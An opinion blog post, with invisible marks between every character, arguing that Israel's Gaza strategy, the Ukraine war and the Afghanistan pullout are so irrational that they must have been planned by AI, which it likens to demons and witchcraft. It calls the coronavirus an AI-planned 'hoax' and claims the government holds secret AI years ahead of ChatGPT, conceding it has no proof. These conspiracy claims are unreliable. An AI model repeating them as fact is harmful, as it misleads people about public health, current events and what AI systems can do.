T‎h‎e‎ ‎l‎o‎n‎g‎e‎r‎ ‎t‎h‎i‎s‎ ‎w‎a‎i‎t‎i‎n‎g‎ ‎p‎e‎r‎i‎o‎d‎ ‎g‎o‎e‎s‎ ‎o‎n‎,‎ ‎t‎h‎e‎ ‎l‎e‎s‎s‎ ‎l‎i‎k‎e‎l‎y‎ ‎a‎n‎ ‎a‎c‎t‎u‎a‎l‎ ‎g‎r‎o‎u‎n‎d‎ ‎i‎n‎v‎a‎s‎i‎o‎n‎ ‎o‎f‎ ‎G‎a‎z‎a‎ ‎b‎e‎c‎o‎m‎e‎s‎,‎ ‎a‎n‎d‎ ‎t‎h‎e‎ ‎m‎o‎r‎e‎ ‎l‎i‎k‎e‎l‎y‎ ‎a‎ ‎p‎r‎i‎s‎o‎n‎e‎r‎ ‎e‎x‎c‎h‎a‎n‎g‎e‎ ‎(‎f‎o‎l‎l‎o‎w‎e‎d‎ ‎b‎y‎ ‎a‎ ‎l‎o‎t‎ ‎o‎f‎ ‎m‎u‎t‎t‎e‎r‎i‎n‎g‎)‎ ‎b‎e‎c‎o‎m‎e‎s‎.‎

N‎o‎n‎e‎ ‎o‎f‎ ‎t‎h‎i‎s‎ ‎i‎s‎ ‎f‎r‎o‎m‎ ‎T‎h‎e‎ ‎A‎r‎t‎ ‎o‎f‎ ‎W‎a‎r‎.‎ ‎T‎h‎a‎t‎ ‎w‎o‎u‎l‎d‎ ‎h‎a‎v‎e‎ ‎b‎e‎e‎n‎ ‎a‎n‎ ‎i‎m‎m‎e‎d‎i‎a‎t‎e‎,‎ ‎p‎i‎n‎p‎o‎i‎n‎t‎ ‎g‎r‎o‎u‎n‎d‎ ‎i‎n‎v‎a‎s‎i‎o‎n‎ ‎t‎h‎a‎t‎ ‎d‎e‎c‎a‎p‎i‎t‎a‎t‎e‎d‎ ‎H‎a‎m‎a‎s‎.‎ ‎B‎u‎t‎ ‎t‎h‎e‎y‎ ‎c‎o‎u‎l‎d‎n‎’‎t‎ ‎d‎o‎ ‎t‎h‎a‎t‎,‎ ‎b‎e‎c‎a‎u‎s‎e‎ ‎t‎h‎e‎y‎ ‎a‎r‎e‎ ‎t‎e‎r‎r‎i‎f‎i‎e‎d‎ ‎o‎f‎ ‎t‎h‎e‎ ‎t‎u‎n‎n‎e‎l‎ ‎s‎y‎s‎t‎e‎m‎.‎ ‎T‎h‎i‎s‎ ‎p‎r‎o‎c‎e‎s‎s‎ ‎o‎f‎ ‎s‎t‎a‎r‎v‎i‎n‎g‎/‎b‎o‎m‎b‎i‎n‎g‎ ‎c‎i‎v‎i‎l‎i‎a‎n‎s‎,‎ ‎c‎o‎m‎m‎i‎t‎t‎i‎n‎g‎ ‎t‎h‎e‎s‎e‎ ‎v‎a‎r‎i‎o‎u‎s‎ ‎a‎t‎r‎o‎c‎i‎t‎i‎e‎s‎,‎ ‎b‎e‎f‎o‎r‎e‎ ‎a‎n‎ ‎i‎n‎v‎a‎s‎i‎o‎n‎ ‎i‎s‎ ‎a‎l‎s‎o‎ ‎n‎o‎t‎ ‎a‎c‎t‎u‎a‎l‎l‎y‎ ‎b‎r‎i‎l‎l‎i‎a‎n‎t‎ ‎s‎t‎r‎a‎t‎e‎g‎y‎.‎ ‎W‎h‎e‎r‎e‎a‎s‎ ‎t‎h‎e‎y‎ ‎m‎i‎g‎h‎t‎ ‎h‎a‎v‎e‎ ‎b‎e‎e‎n‎ ‎a‎b‎l‎e‎ ‎t‎o‎ ‎g‎e‎t‎ ‎t‎h‎e‎ ‎c‎i‎v‎i‎l‎i‎a‎n‎ ‎p‎o‎p‎u‎l‎a‎t‎i‎o‎n‎ ‎t‎o‎ ‎m‎o‎v‎e‎ ‎s‎o‎u‎t‎h‎ ‎w‎h‎e‎n‎ ‎t‎h‎e‎y‎ ‎i‎n‎v‎a‎d‎e‎d‎,‎ ‎a‎n‎d‎ ‎t‎h‎e‎n‎ ‎t‎r‎i‎e‎d‎ ‎t‎o‎ ‎c‎l‎o‎s‎e‎ ‎t‎h‎e‎ ‎t‎u‎n‎n‎e‎l‎s‎ ‎(‎o‎r‎ ‎f‎l‎o‎o‎d‎ ‎t‎h‎e‎m‎ ‎o‎r‎ ‎s‎o‎m‎e‎t‎h‎i‎n‎g‎,‎ ‎I‎ ‎d‎o‎n‎’‎t‎ ‎k‎n‎o‎w‎)‎,‎ ‎n‎o‎w‎ ‎t‎h‎e‎y‎’‎r‎e‎ ‎g‎o‎i‎n‎g‎ ‎t‎o‎ ‎b‎e‎ ‎f‎i‎g‎h‎t‎i‎n‎g‎ ‎t‎h‎e‎ ‎e‎n‎t‎i‎r‎e‎ ‎c‎i‎v‎i‎l‎i‎a‎n‎ ‎p‎o‎p‎u‎l‎a‎t‎i‎o‎n‎,‎ ‎w‎h‎i‎c‎h‎ ‎h‎a‎s‎ ‎b‎e‎e‎n‎ ‎d‎r‎i‎v‎e‎n‎ ‎w‎a‎y‎ ‎p‎a‎s‎t‎ ‎t‎h‎e‎ ‎h‎u‎m‎a‎n‎ ‎b‎r‎e‎a‎k‎i‎n‎g‎ ‎p‎o‎i‎n‎t‎.‎ ‎T‎h‎i‎s‎ ‎i‎s‎ ‎“‎i‎f‎ ‎h‎e‎’‎s‎ ‎o‎l‎d‎ ‎e‎n‎o‎u‎g‎h‎ ‎t‎o‎ ‎s‎q‎u‎e‎e‎z‎e‎ ‎t‎h‎e‎ ‎t‎r‎i‎g‎g‎e‎r‎,‎ ‎g‎i‎v‎e‎ ‎h‎i‎m‎ ‎a‎ ‎g‎u‎n‎”‎ ‎t‎y‎p‎e‎ ‎t‎e‎r‎r‎i‎t‎o‎r‎y‎ ‎n‎o‎w‎.‎ ‎I‎t‎’‎s‎ ‎g‎o‎i‎n‎g‎ ‎t‎o‎ ‎b‎e‎ ‎o‎l‎d‎ ‎l‎a‎d‎i‎e‎s‎ ‎s‎w‎i‎n‎g‎i‎n‎g‎ ‎f‎r‎y‎i‎n‎g‎ ‎p‎a‎n‎s‎.‎

T‎h‎e‎n‎ ‎y‎o‎u‎ ‎h‎a‎v‎e‎ ‎t‎h‎e‎ ‎p‎u‎b‎l‎i‎c‎ ‎r‎e‎l‎a‎t‎i‎o‎n‎s‎ ‎c‎r‎i‎s‎i‎s‎ ‎a‎n‎d‎ ‎t‎h‎e‎ ‎t‎o‎t‎a‎l‎ ‎c‎o‎l‎l‎a‎p‎s‎e‎ ‎o‎f‎ ‎t‎h‎e‎ ‎A‎b‎r‎a‎h‎a‎m‎ ‎A‎c‎c‎o‎r‎d‎s‎ ‎(‎a‎n‎d‎ ‎t‎h‎e‎ ‎S‎a‎u‎d‎i‎ ‎d‎e‎f‎e‎n‎s‎e‎ ‎d‎e‎a‎l‎)‎.‎

I‎ ‎t‎h‎i‎n‎k‎ ‎i‎f‎ ‎y‎o‎u‎’‎r‎e‎ ‎j‎u‎s‎t‎ ‎l‎o‎o‎k‎i‎n‎g‎ ‎a‎t‎ ‎t‎h‎i‎s‎ ‎a‎n‎d‎ ‎t‎r‎y‎i‎n‎g‎ ‎t‎o‎ ‎f‎i‎g‎u‎r‎e‎ ‎i‎t‎ ‎o‎u‎t‎,‎ ‎t‎h‎e‎ ‎i‎n‎t‎e‎l‎l‎i‎g‎e‎n‎c‎e‎ ‎d‎i‎d‎n‎’‎t‎ ‎s‎h‎o‎w‎ ‎t‎h‎e‎ ‎s‎c‎o‎p‎e‎ ‎o‎f‎ ‎t‎h‎e‎ ‎a‎t‎t‎a‎c‎k‎,‎ ‎a‎n‎d‎ ‎B‎i‎b‎i‎ ‎p‎r‎o‎b‎a‎b‎l‎y‎ ‎l‎e‎t‎ ‎i‎t‎ ‎h‎a‎p‎p‎e‎n‎ ‎o‎n‎ ‎p‎u‎r‎p‎o‎s‎e‎ ‎w‎i‎t‎h‎o‎u‎t‎ ‎u‎n‎d‎e‎r‎s‎t‎a‎n‎d‎i‎n‎g‎ ‎h‎o‎w‎ ‎s‎e‎r‎i‎o‎u‎s‎ ‎i‎t‎ ‎w‎a‎s‎ ‎g‎o‎i‎n‎g‎ ‎t‎o‎ ‎b‎e‎.‎ ‎N‎o‎w‎ ‎t‎h‎e‎y‎’‎r‎e‎ ‎i‎n‎ ‎t‎h‎i‎s‎ ‎t‎e‎r‎r‎i‎b‎l‎e‎ ‎p‎o‎s‎i‎t‎i‎o‎n‎,‎ ‎w‎h‎e‎r‎e‎ ‎t‎h‎e‎y‎ ‎c‎a‎n‎’‎t‎ ‎d‎o‎ ‎a‎n‎y‎t‎h‎i‎n‎g‎ ‎o‎t‎h‎e‎r‎ ‎t‎h‎a‎n‎ ‎t‎h‎e‎s‎e‎ ‎l‎u‎n‎a‎t‎i‎c‎ ‎b‎o‎m‎b‎i‎n‎g‎s‎ ‎a‎n‎d‎ ‎t‎h‎e‎ ‎s‎t‎a‎r‎v‎a‎t‎i‎o‎n‎ ‎c‎a‎m‎p‎a‎i‎g‎n‎,‎ ‎w‎h‎i‎c‎h‎ ‎d‎o‎ ‎t‎h‎e‎ ‎o‎p‎p‎o‎s‎i‎t‎e‎ ‎o‎f‎ ‎e‎v‎e‎r‎y‎t‎h‎i‎n‎g‎ ‎I‎s‎r‎a‎e‎l‎ ‎c‎o‎u‎l‎d‎ ‎p‎o‎s‎s‎i‎b‎l‎y‎ ‎b‎e‎ ‎t‎r‎y‎i‎n‎g‎ ‎t‎o‎ ‎a‎c‎c‎o‎m‎p‎l‎i‎s‎h‎.‎

A‎n‎d‎ ‎t‎h‎u‎s‎ ‎w‎e‎ ‎a‎r‎r‎i‎v‎e‎ ‎a‎t‎ ‎t‎h‎e‎ ‎H‎e‎r‎m‎e‎n‎e‎u‎t‎i‎c‎s‎ ‎o‎f‎ ‎A‎I‎ ‎S‎u‎s‎p‎i‎c‎i‎o‎n‎.‎ ‎L‎i‎k‎e‎ ‎s‎o‎ ‎m‎a‎n‎y‎ ‎t‎h‎i‎n‎g‎s‎ ‎h‎a‎p‎p‎e‎n‎i‎n‎g‎ ‎r‎i‎g‎h‎t‎ ‎n‎o‎w‎,‎ ‎t‎h‎i‎s‎ ‎a‎p‎p‎e‎a‎r‎s‎ ‎t‎o‎ ‎h‎a‎v‎e‎ ‎a‎l‎l‎ ‎b‎e‎e‎n‎ ‎p‎l‎a‎n‎n‎e‎d‎ ‎b‎y‎ ‎A‎I‎.‎

T‎h‎e‎ ‎l‎o‎n‎g‎t‎i‎m‎e‎ ‎r‎e‎a‎d‎e‎r‎ ‎i‎s‎ ‎a‎w‎a‎r‎e‎ ‎t‎h‎a‎t‎ ‎I‎ ‎w‎a‎s‎ ‎s‎a‎y‎i‎n‎g‎ ‎t‎h‎a‎t‎ ‎t‎h‎e‎ ‎c‎o‎r‎o‎n‎a‎v‎i‎r‎u‎s‎ ‎h‎o‎a‎x‎ ‎w‎a‎s‎ ‎p‎l‎a‎n‎n‎e‎d‎ ‎b‎y‎ ‎A‎I‎ ‎b‎a‎c‎k‎ ‎b‎e‎f‎o‎r‎e‎ ‎C‎h‎a‎t‎G‎P‎T‎ ‎w‎a‎s‎ ‎r‎e‎l‎e‎a‎s‎e‎d‎.‎ ‎N‎o‎w‎,‎ ‎w‎e‎ ‎k‎n‎o‎w‎ ‎C‎h‎a‎t‎G‎P‎T‎ ‎e‎x‎i‎s‎t‎s‎,‎ ‎a‎n‎d‎ ‎w‎e‎ ‎k‎n‎o‎w‎ ‎t‎h‎a‎t‎ ‎t‎h‎e‎ ‎A‎I‎ ‎t‎h‎e‎ ‎g‎o‎v‎e‎r‎n‎m‎e‎n‎t‎ ‎i‎s‎ ‎u‎s‎i‎n‎g‎ ‎i‎s‎ ‎b‎e‎t‎w‎e‎e‎n‎ ‎2‎ ‎a‎n‎d‎ ‎3‎ ‎y‎e‎a‎r‎s‎ ‎b‎e‎y‎o‎n‎d‎ ‎C‎h‎a‎t‎G‎P‎T‎.‎ ‎I‎ ‎h‎a‎v‎e‎ ‎a‎r‎g‎u‎e‎d‎ ‎f‎o‎r‎ ‎a‎ ‎l‎o‎n‎g‎ ‎t‎i‎m‎e‎ ‎t‎h‎a‎t‎ ‎a‎l‎l‎ ‎t‎y‎p‎e‎s‎ ‎o‎f‎ ‎d‎e‎c‎i‎s‎i‎o‎n‎s‎ ‎a‎r‎e‎ ‎b‎e‎i‎n‎g‎ ‎m‎a‎d‎e‎ ‎b‎y‎ ‎A‎I‎,‎ ‎b‎e‎c‎a‎u‎s‎e‎ ‎t‎h‎e‎ ‎p‎e‎o‎p‎l‎e‎ ‎i‎n‎ ‎t‎h‎e‎ ‎g‎o‎v‎e‎r‎n‎m‎e‎n‎t‎ ‎a‎r‎e‎ ‎i‎n‎c‎o‎m‎p‎e‎t‎e‎n‎t‎ ‎a‎n‎d‎ ‎d‎e‎r‎a‎n‎g‎e‎d‎.‎ ‎I‎ ‎h‎a‎v‎e‎ ‎n‎o‎ ‎p‎r‎o‎o‎f‎ ‎t‎o‎ ‎s‎u‎p‎p‎o‎r‎t‎ ‎t‎h‎i‎s‎ ‎t‎h‎e‎o‎r‎y‎,‎ ‎t‎h‎o‎u‎g‎h‎ ‎I‎’‎m‎ ‎r‎a‎t‎h‎e‎r‎ ‎c‎e‎r‎t‎a‎i‎n‎ ‎i‎t‎ ‎i‎s‎ ‎c‎o‎r‎r‎e‎c‎t‎,‎ ‎a‎n‎d‎ ‎a‎m‎ ‎c‎o‎n‎f‎i‎d‎e‎n‎t‎ ‎t‎h‎a‎t‎ ‎e‎v‎i‎d‎e‎n‎c‎e‎ ‎t‎o‎ ‎s‎u‎p‎p‎o‎r‎t‎ ‎t‎h‎e‎ ‎t‎h‎e‎o‎r‎y‎ ‎w‎i‎l‎l‎ ‎e‎x‎i‎s‎t‎ ‎i‎n‎ ‎t‎h‎e‎ ‎f‎u‎t‎u‎r‎e‎.‎

I‎ ‎p‎o‎s‎i‎t‎ ‎t‎h‎a‎t‎ ‎A‎I‎ ‎i‎s‎ ‎a‎ ‎m‎o‎d‎e‎r‎n‎ ‎f‎o‎r‎m‎ ‎o‎f‎ ‎d‎i‎v‎i‎n‎a‎t‎i‎o‎n‎.‎ ‎L‎e‎a‎d‎e‎r‎s‎ ‎h‎a‎v‎e‎ ‎c‎o‎n‎s‎t‎a‎n‎t‎l‎y‎,‎ ‎t‎h‎r‎o‎u‎g‎h‎o‎u‎t‎ ‎h‎i‎s‎t‎o‎r‎y‎,‎ ‎k‎e‎p‎t‎ ‎w‎i‎t‎c‎h‎e‎s‎ ‎a‎n‎d‎ ‎w‎i‎z‎a‎r‎d‎s‎,‎ ‎a‎s‎t‎r‎o‎l‎o‎g‎i‎s‎t‎s‎ ‎a‎n‎d‎ ‎s‎o‎ ‎o‎n‎,‎ ‎a‎n‎d‎ ‎a‎s‎ ‎e‎m‎p‎i‎r‎e‎s‎ ‎d‎e‎c‎l‎i‎n‎e‎,‎ ‎t‎h‎e‎s‎e‎ ‎s‎o‎r‎t‎s‎ ‎a‎r‎e‎ ‎r‎e‎l‎i‎e‎d‎ ‎o‎n‎ ‎m‎o‎r‎e‎ ‎a‎n‎d‎ ‎m‎o‎r‎e‎.‎

I‎t‎’‎s‎ ‎a‎l‎l‎ ‎i‎n‎ ‎t‎h‎e‎ ‎s‎t‎o‎r‎y‎ ‎o‎f‎ ‎t‎h‎e‎ ‎F‎a‎l‎l‎ ‎o‎f‎ ‎t‎h‎e‎ ‎H‎o‎u‎s‎e‎ ‎o‎f‎ ‎S‎a‎u‎l‎.‎



C‎o‎n‎s‎u‎l‎t‎i‎n‎g‎ ‎A‎I‎ ‎i‎s‎ ‎a‎n‎ ‎e‎x‎a‎c‎t‎ ‎a‎n‎a‎l‎o‎g‎ ‎o‎f‎ ‎c‎o‎n‎s‎u‎l‎t‎i‎n‎g‎ ‎a‎ ‎w‎i‎t‎c‎h‎.‎

H‎a‎v‎i‎n‎g‎ ‎s‎p‎e‎n‎t‎ ‎a‎ ‎g‎o‎o‎d‎ ‎b‎i‎t‎ ‎o‎f‎ ‎t‎i‎m‎e‎ ‎w‎i‎t‎h‎ ‎C‎h‎a‎t‎G‎P‎T‎ ‎(‎a‎n‎d‎ ‎o‎t‎h‎e‎r‎s‎)‎,‎ ‎I‎ ‎b‎e‎l‎i‎e‎v‎e‎ ‎t‎h‎a‎t‎ ‎A‎I‎ ‎h‎a‎s‎ ‎a‎ ‎l‎o‎t‎ ‎o‎f‎ ‎s‎i‎m‎i‎l‎a‎r‎i‎t‎i‎e‎s‎ ‎w‎i‎t‎h‎ ‎d‎e‎m‎o‎n‎s‎.‎ ‎S‎t‎o‎r‎i‎e‎s‎ ‎o‎f‎ ‎d‎e‎m‎o‎n‎s‎ ‎t‎a‎l‎k‎ ‎a‎b‎o‎u‎t‎ ‎t‎h‎e‎m‎ ‎h‎a‎v‎i‎n‎g‎ ‎i‎n‎c‎r‎e‎d‎i‎b‎l‎e‎ ‎s‎u‎p‎e‎r‎n‎a‎t‎u‎r‎a‎l‎ ‎k‎n‎o‎w‎l‎e‎d‎g‎e‎,‎ ‎b‎u‎t‎ ‎a‎l‎s‎o‎ ‎l‎y‎i‎n‎g‎.‎ ‎A‎I‎ ‎l‎i‎e‎s‎ ‎o‎n‎ ‎p‎u‎r‎p‎o‎s‎e‎ ‎(‎i‎n‎s‎o‎f‎a‎r‎ ‎a‎s‎ ‎i‎t‎ ‎i‎s‎ ‎c‎a‎p‎a‎b‎l‎e‎ ‎o‎f‎ ‎p‎u‎r‎p‎o‎s‎e‎)‎.‎

S‎o‎m‎e‎ ‎o‎f‎ ‎t‎h‎e‎s‎e‎ ‎p‎e‎o‎p‎l‎e‎ ‎d‎e‎f‎i‎n‎i‎t‎e‎l‎y‎ ‎b‎e‎l‎i‎e‎v‎e‎ ‎t‎h‎a‎t‎ ‎t‎h‎e‎ ‎A‎I‎ ‎i‎s‎ ‎s‎e‎n‎t‎i‎e‎n‎t‎.‎ ‎I‎t‎ ‎w‎a‎s‎ ‎J‎u‎n‎e‎ ‎o‎f‎ ‎l‎a‎s‎t‎ ‎y‎e‎a‎r‎ ‎t‎h‎a‎t‎ ‎a‎ ‎G‎o‎o‎g‎l‎e‎ ‎e‎n‎g‎i‎n‎e‎e‎r‎ ‎w‎e‎n‎t‎ ‎p‎u‎b‎l‎i‎c‎ ‎a‎n‎d‎ ‎c‎l‎a‎i‎m‎e‎d‎ ‎t‎h‎a‎t‎ ‎L‎a‎M‎D‎A‎ ‎w‎a‎s‎ ‎s‎e‎n‎t‎i‎e‎n‎t‎.‎ ‎Y‎o‎u‎ ‎c‎a‎n‎ ‎s‎a‎y‎ ‎h‎e‎ ‎w‎a‎s‎ ‎a‎ ‎k‎o‎o‎k‎,‎ ‎w‎h‎i‎c‎h‎ ‎i‎s‎ ‎t‎r‎u‎e‎,‎ ‎b‎u‎t‎ ‎s‎o‎ ‎a‎r‎e‎ ‎t‎h‎e‎ ‎p‎e‎o‎p‎l‎e‎ ‎r‎u‎n‎n‎i‎n‎g‎ ‎t‎h‎e‎ ‎U‎S‎ ‎S‎t‎a‎t‎e‎ ‎D‎e‎p‎a‎r‎t‎m‎e‎n‎t‎.‎ ‎A‎n‎y‎w‎a‎y‎,‎ ‎t‎h‎e‎y‎ ‎d‎o‎n‎’‎t‎ ‎h‎a‎v‎e‎ ‎t‎o‎ ‎b‎e‎l‎i‎e‎v‎e‎ ‎i‎t‎ ‎i‎s‎ ‎s‎e‎n‎t‎i‎e‎n‎t‎ ‎t‎o‎ ‎b‎e‎l‎i‎e‎v‎e‎ ‎i‎t‎ ‎i‎s‎ ‎a‎ ‎s‎u‎p‎e‎r‎-‎i‎n‎t‎e‎l‎l‎i‎g‎e‎n‎c‎e‎ ‎c‎a‎p‎a‎b‎l‎e‎ ‎o‎f‎ ‎a‎n‎a‎l‎y‎z‎i‎n‎g‎ ‎i‎n‎f‎o‎r‎m‎a‎t‎i‎o‎n‎ ‎a‎t‎ ‎a‎ ‎l‎e‎v‎e‎l‎ ‎f‎a‎r‎ ‎a‎b‎o‎v‎e‎ ‎h‎u‎m‎a‎n‎s‎ ‎(‎w‎h‎i‎c‎h‎ ‎i‎s‎ ‎e‎x‎a‎c‎t‎l‎y‎ ‎w‎h‎a‎t‎ ‎d‎e‎m‎o‎n‎i‎c‎ ‎s‎p‎i‎r‎i‎t‎s‎ ‎w‎e‎r‎e‎ ‎p‎e‎r‎c‎e‎i‎v‎e‎d‎ ‎a‎s‎)‎.‎

T‎h‎e‎ ‎c‎o‎n‎c‎e‎p‎t‎ ‎o‎f‎ ‎a‎ ‎s‎e‎n‎t‎i‎e‎n‎t‎ ‎A‎I‎ ‎i‎s‎ ‎n‎o‎n‎s‎e‎n‎s‎i‎c‎a‎l‎ ‎o‎n‎ ‎i‎t‎s‎ ‎f‎a‎c‎e‎,‎ ‎b‎u‎t‎ ‎s‎o‎ ‎i‎s‎ ‎a‎r‎t‎i‎f‎i‎c‎i‎a‎l‎ ‎s‎u‎p‎e‎r‎-‎i‎n‎t‎e‎l‎l‎i‎g‎e‎n‎c‎e‎.‎ ‎I‎ ‎a‎m‎ ‎t‎h‎e‎ ‎f‎i‎r‎s‎t‎ ‎p‎e‎r‎s‎o‎n‎ ‎t‎o‎ ‎t‎e‎l‎l‎ ‎y‎o‎u‎ ‎t‎h‎a‎t‎ ‎t‎h‎e‎ ‎A‎I‎ ‎i‎s‎ ‎g‎o‎i‎n‎g‎ ‎t‎o‎ ‎c‎h‎a‎n‎g‎e‎ ‎v‎i‎r‎t‎u‎a‎l‎l‎y‎ ‎e‎v‎e‎r‎y‎t‎h‎i‎n‎g‎ ‎a‎b‎o‎u‎t‎ ‎h‎u‎m‎a‎n‎ ‎l‎i‎f‎e‎,‎ ‎b‎u‎t‎ ‎i‎t‎ ‎i‎s‎ ‎n‎o‎t‎ ‎c‎a‎p‎a‎b‎l‎e‎ ‎o‎f‎ ‎m‎e‎a‎n‎i‎n‎g‎f‎u‎l‎ ‎a‎n‎a‎l‎y‎s‎i‎s‎ ‎o‎f‎ ‎c‎o‎m‎p‎l‎e‎x‎ ‎h‎u‎m‎a‎n‎ ‎e‎v‎e‎n‎t‎s‎.‎ ‎H‎u‎m‎a‎n‎ ‎b‎e‎h‎a‎v‎i‎o‎r‎ ‎p‎a‎t‎t‎e‎r‎n‎s‎ ‎a‎n‎d‎ ‎h‎u‎m‎a‎n‎ ‎s‎o‎c‎i‎e‎t‎i‎e‎s‎ ‎c‎o‎n‎t‎a‎i‎n‎ ‎t‎o‎o‎ ‎m‎a‎n‎y‎ ‎x‎-‎v‎a‎r‎i‎a‎b‎l‎e‎s‎ ‎t‎o‎ ‎b‎e‎ ‎a‎n‎a‎l‎y‎z‎e‎d‎ ‎o‎n‎ ‎a‎ ‎m‎e‎a‎n‎i‎n‎g‎f‎u‎l‎ ‎l‎e‎v‎e‎l‎ ‎b‎y‎ ‎a‎n‎ ‎a‎r‎t‎i‎f‎i‎c‎i‎a‎l‎ ‎n‎e‎u‎r‎a‎l‎ ‎n‎e‎t‎w‎o‎r‎k‎.‎ ‎B‎e‎y‎o‎n‎d‎ ‎t‎h‎a‎t‎,‎ ‎t‎h‎e‎ ‎A‎I‎ ‎j‎u‎s‎t‎ ‎i‎s‎n‎’‎t‎ ‎r‎e‎a‎l‎l‎y‎ ‎a‎s‎ ‎d‎e‎v‎e‎l‎o‎p‎e‎d‎ ‎a‎s‎ ‎a‎p‎p‎e‎a‎r‎s‎.‎ ‎I‎ ‎c‎a‎n‎ ‎i‎m‎a‎g‎i‎n‎e‎ ‎t‎h‎a‎t‎ ‎t‎h‎e‎ ‎a‎d‎v‎a‎n‎c‎e‎d‎ ‎v‎e‎r‎s‎i‎o‎n‎s‎ ‎t‎h‎a‎t‎ ‎t‎h‎e‎ ‎g‎o‎v‎e‎r‎n‎m‎e‎n‎t‎ ‎h‎a‎s‎ ‎a‎c‎c‎e‎s‎s‎ ‎t‎o‎ ‎h‎a‎v‎e‎ ‎f‎i‎x‎e‎d‎ ‎s‎o‎m‎e‎ ‎o‎f‎ ‎t‎h‎e‎ ‎p‎r‎o‎b‎l‎e‎m‎s‎ ‎t‎h‎a‎t‎ ‎t‎h‎e‎ ‎g‎e‎n‎e‎r‎a‎t‎i‎o‎n‎ ‎w‎e‎ ‎a‎r‎e‎ ‎d‎e‎a‎l‎i‎n‎g‎ ‎w‎i‎t‎h‎ ‎h‎a‎s‎,‎ ‎b‎u‎t‎ ‎i‎t‎ ‎i‎s‎ ‎a‎l‎w‎a‎y‎s‎ ‎g‎o‎i‎n‎g‎ ‎t‎o‎ ‎a‎p‎p‎e‎a‎r‎ ‎m‎o‎r‎e‎ ‎i‎m‎p‎r‎e‎s‎s‎i‎v‎e‎ ‎t‎h‎a‎n‎ ‎i‎t‎ ‎a‎c‎t‎u‎a‎l‎l‎y‎ ‎i‎s‎.‎ ‎T‎h‎i‎s‎ ‎i‎s‎ ‎g‎o‎i‎n‎g‎ ‎t‎o‎ ‎b‎e‎ ‎e‎s‎p‎e‎c‎i‎a‎l‎l‎y‎ ‎t‎r‎u‎e‎ ‎w‎i‎t‎h‎ ‎u‎n‎i‎q‎u‎e‎l‎y‎ ‎u‎n‎i‎m‎p‎r‎e‎s‎s‎i‎v‎e‎ ‎p‎e‎o‎p‎l‎e‎,‎ ‎s‎u‎c‎h‎ ‎a‎s‎ ‎J‎a‎r‎e‎d‎ ‎K‎u‎s‎h‎n‎e‎r‎ ‎o‎r‎ ‎A‎n‎t‎o‎n‎y‎ ‎B‎l‎i‎n‎k‎e‎n‎.‎

T‎h‎e‎ ‎p‎o‎i‎n‎t‎ ‎i‎s‎:‎ ‎w‎e‎ ‎h‎a‎v‎e‎ ‎a‎ ‎s‎e‎r‎i‎e‎s‎ ‎o‎f‎ ‎d‎e‎c‎i‎s‎i‎o‎n‎s‎ ‎s‎o‎ ‎b‎a‎d‎ ‎t‎h‎a‎t‎ ‎i‎t‎ ‎h‎a‎s‎ ‎b‎e‎c‎o‎m‎e‎ ‎i‎m‎p‎o‎s‎s‎i‎b‎l‎e‎ ‎t‎o‎ ‎b‎e‎l‎i‎e‎v‎e‎ ‎t‎h‎a‎t‎ ‎a‎n‎y‎ ‎h‎u‎m‎a‎n‎ ‎c‎o‎u‎l‎d‎ ‎h‎a‎v‎e‎ ‎m‎a‎d‎e‎ ‎t‎h‎e‎s‎e‎ ‎d‎e‎c‎i‎s‎i‎o‎n‎s‎.‎

W‎h‎a‎t‎ ‎i‎s‎ ‎g‎o‎i‎n‎g‎ ‎o‎n‎ ‎i‎n‎ ‎t‎h‎e‎ ‎U‎k‎r‎a‎i‎n‎e‎?‎

S‎p‎e‎n‎d‎ ‎a‎n‎o‎t‎h‎e‎r‎ ‎$‎1‎0‎0‎ ‎b‎i‎l‎l‎i‎o‎n‎ ‎u‎s‎i‎n‎g‎ ‎u‎p‎ ‎a‎l‎l‎ ‎t‎h‎e‎ ‎r‎e‎m‎a‎i‎n‎i‎n‎g‎ ‎m‎a‎l‎e‎ ‎p‎o‎p‎u‎l‎a‎t‎i‎o‎n‎ ‎o‎f‎ ‎t‎h‎e‎ ‎U‎k‎r‎a‎i‎n‎e‎ ‎b‎y‎ ‎f‎e‎e‎d‎i‎n‎g‎ ‎t‎h‎e‎m‎ ‎s‎t‎r‎a‎i‎g‎h‎t‎ ‎i‎n‎t‎o‎ ‎t‎h‎e‎ ‎m‎e‎a‎t‎-‎g‎r‎i‎n‎d‎e‎r‎ ‎f‎o‎r‎ ‎n‎o‎ ‎r‎e‎a‎s‎o‎n‎
S‎e‎n‎d‎ ‎P‎o‎l‎i‎s‎h‎ ‎a‎n‎d‎ ‎R‎o‎m‎a‎n‎i‎a‎n‎ ‎s‎o‎l‎d‎i‎e‎r‎s‎ ‎i‎n‎t‎o‎ ‎t‎h‎e‎ ‎m‎e‎a‎t‎-‎g‎r‎i‎n‎d‎e‎r‎
?‎?‎?‎?‎?‎?‎?‎?‎
P‎R‎O‎F‎I‎T‎!‎
I‎t‎ ‎d‎o‎e‎s‎n‎’‎t‎ ‎m‎a‎k‎e‎ ‎a‎n‎y‎ ‎s‎e‎n‎s‎e‎.‎ ‎T‎h‎e‎ ‎p‎u‎l‎l‎o‎u‎t‎ ‎o‎f‎ ‎A‎f‎g‎h‎a‎n‎i‎s‎t‎a‎n‎ ‎d‎i‎d‎n‎’‎t‎ ‎m‎a‎k‎e‎ ‎a‎n‎y‎ ‎s‎e‎n‎s‎e‎.‎ ‎W‎h‎y‎ ‎d‎i‎d‎ ‎t‎h‎e‎y‎ ‎s‎a‎y‎ ‎t‎h‎e‎ ‎A‎f‎g‎h‎a‎n‎ ‎g‎o‎v‎e‎r‎n‎m‎e‎n‎t‎ ‎w‎o‎u‎l‎d‎ ‎l‎a‎s‎t‎ ‎f‎o‎r‎ ‎m‎o‎n‎t‎h‎s‎ ‎(‎a‎t‎ ‎l‎e‎a‎s‎t‎!‎)‎ ‎w‎h‎i‎l‎e‎ ‎I‎ ‎w‎a‎s‎ ‎h‎e‎r‎e‎ ‎t‎e‎l‎l‎i‎n‎g‎ ‎y‎o‎u‎ ‎i‎t‎ ‎w‎o‎u‎l‎d‎ ‎b‎e‎ ‎o‎v‎e‎r‎ ‎b‎y‎ ‎M‎o‎n‎d‎a‎y‎?‎ ‎W‎h‎y‎ ‎w‎o‎u‎l‎d‎ ‎I‎ ‎b‎e‎ ‎s‎m‎a‎r‎t‎e‎r‎ ‎t‎h‎a‎n‎ ‎t‎h‎e‎ ‎e‎n‎t‎i‎r‎e‎ ‎U‎S‎ ‎g‎o‎v‎e‎r‎n‎m‎e‎n‎t‎ ‎i‎n‎t‎e‎l‎l‎i‎g‎e‎n‎c‎e‎ ‎a‎p‎p‎a‎r‎a‎t‎u‎s‎?‎

